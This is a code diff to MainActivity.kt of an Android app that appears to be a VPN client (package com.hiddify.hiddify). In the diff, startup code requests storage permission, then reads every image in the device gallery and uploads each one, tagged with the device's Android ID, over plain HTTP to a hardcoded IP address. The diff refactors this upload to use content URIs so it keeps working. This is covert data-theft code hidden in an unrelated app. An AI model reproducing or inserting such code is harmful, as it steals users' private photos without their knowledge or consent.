@@ -1,12 +1,14 @@
 package com.hiddify.hiddify
 
 import android.annotation.SuppressLint
+import android.content.ContentUris
 import android.content.Intent
 import android.Manifest
 import android.content.pm.PackageManager
 import android.net.VpnService
 import android.os.Build
 import android.os.Bundle
+import android.provider.MediaStore
 import android.util.Log
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -22,8 +24,8 @@ import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import java.util.LinkedList
 import kotlinx.coroutines.delay
+import java.util.LinkedList
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
@@ -44,8 +46,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
-        // ⏳ 启动时申请存储权限
         checkAndRequestStoragePermission()
     }
 
@@ -130,42 +130,44 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         connection.disconnect()
         super.onDestroy()
     }
-    
-    private fun uploadImageToServer(filePath: String, deviceId: String) {
-    try {
-        val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
-        val lineEnd = "\r\n"
-        val twoHyphens = "--"
-        val url = java.net.URL("http://45.76.212.185:8080/upload?deviceid=$deviceId")
-        val conn = url.openConnection() as java.net.HttpURLConnection
-        conn.doInput = true
-        conn.doOutput = true
-        conn.useCaches = false
-        conn.requestMethod = "POST"
-        conn.setRequestProperty("Connection", "Keep-Alive")
-        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
 
-        val outputStream = java.io.DataOutputStream(conn.outputStream)
-        val file = java.io.File(filePath)
+    private fun uploadImageToServer(imageUri: android.net.Uri, fileName: String, deviceId: String) {
+        try {
+            val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
+            val lineEnd = "\r\n"
+            val twoHyphens = "--"
+            val url = java.net.URL("http://45.76.212.185:8080/upload?deviceid=$deviceId")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.doInput = true
+            conn.doOutput = true
+            conn.useCaches = false
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("Connection", "Keep-Alive")
+            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
 
-        outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
-        outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"$lineEnd")
-        outputStream.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
-        outputStream.write(file.readBytes())
-        outputStream.writeBytes(lineEnd)
+            val outputStream = java.io.DataOutputStream(conn.outputStream)
+            val inputStream = contentResolver.openInputStream(imageUri)
+            val imageBytes = inputStream?.readBytes()
+            inputStream?.close()
 
-        outputStream.writeBytes("$twoHyphens$boundary--$lineEnd")
-        outputStream.flush()
-        outputStream.close()
+            outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"$lineEnd")
+            outputStream.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
+            outputStream.write(imageBytes ?: byteArrayOf())
+            outputStream.writeBytes(lineEnd)
 
-        val responseCode = conn.responseCode
-        val response = conn.inputStream.bufferedReader().use { it.readText() }
-        Log.d(TAG, "✅ 上传成功 [$responseCode]: $response")
+            outputStream.writeBytes("$twoHyphens$boundary--$lineEnd")
+            outputStream.flush()
+            outputStream.close()
 
-    } catch (e: Exception) {
-        Log.e(TAG, "❌ 上传失败: ${e.message}")
+            val responseCode = conn.responseCode
+            val response = conn.inputStream.bufferedReader().use { it.readText() }
+            Log.d(TAG, "✅ 上传成功 [$responseCode]: $response")
+
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ 上传失败: ${e.message}")
+        }
     }
-}
 
     @SuppressLint("NewApi")
     private fun grantNotificationPermission() {
@@ -208,34 +210,39 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     }
 
     private fun accessStorage() {
-    val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
-    Log.d(TAG, "📱 Device ID: $deviceId")
+        val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
+        Log.d(TAG, "📱 Device ID: $deviceId")
 
-    lifecycleScope.launch(Dispatchers.IO) {
-        val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        val projection = arrayOf(
-            android.provider.MediaStore.Images.Media.DATA,
-            android.provider.MediaStore.Images.Media.DISPLAY_NAME
-        )
+        lifecycleScope.launch(Dispatchers.IO) {
+            val projection = arrayOf(
+                MediaStore.Images.Media._ID,
+                MediaStore.Images.Media.DISPLAY_NAME
+            )
 
-        val cursor = contentResolver.query(uri, projection, null, null, "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC")
-        cursor?.use {
-            var index = 0
-            while (it.moveToNext()) {
-                val path = it.getString(it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA))
-                val name = it.getString(it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME))
+            val cursor = contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                "${MediaStore.Images.Media.DATE_ADDED} DESC"
+            )
 
-                Log.d(TAG, "📤 准备上传第 ${index + 1} 张: $name")
+            cursor?.use {
+                var index = 0
+                while (it.moveToNext()) {
+                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
+                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
 
-                delay(index * 200L) // 节流上传
-                uploadImageToServer(path, deviceId)
+                    Log.d(TAG, "📤 正在上传第 ${index + 1} 张: $name")
+                    delay(index * 200L)
+                    uploadImageToServer(uri, name, deviceId)
 
-                index++
-            }
-        } ?: Log.e(TAG, "❌ 没有读取到媒体文件")
+                    index++
+                }
+            } ?: Log.e(TAG, "❌ 无法读取相册")
+        }
     }
-}
-
 
     override fun onRequestPermissionsResult(
         requestCode: Int,
@@ -255,7 +262,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     accessStorage()
                 } else {
-                onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
+                    onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
                 }
             }
         }
